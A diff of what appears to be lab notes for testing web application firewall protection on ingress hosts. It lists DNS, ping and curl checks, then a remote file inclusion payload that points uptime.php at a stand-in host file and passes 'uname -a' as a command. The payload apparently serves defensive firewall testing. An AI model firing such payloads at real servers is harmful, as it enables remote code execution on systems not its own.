@@ -1,1 +1,24 @@
-/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
+resolvectl status
+
+ping web1.default.avi.com
+
+curl web1.default.avi.com
+
+ping ingress.cluster1.avi.com
+
+curl ingress.cluster1.avi.com
+
+ping ingress.cluster1.avi.com
+
+curl -k https://ingress.cluster1.avi.com
+
+ping secure-ingress.cluster1.avi.com
+
+curl -k https://secure-ingress.cluster1.avi.com
+
+
+curl -k "https://secure-ingress.cluster1.avi.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a"
+
+or
+
+http --verify=no "https://secure-ingress.cluster1.avi.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a"
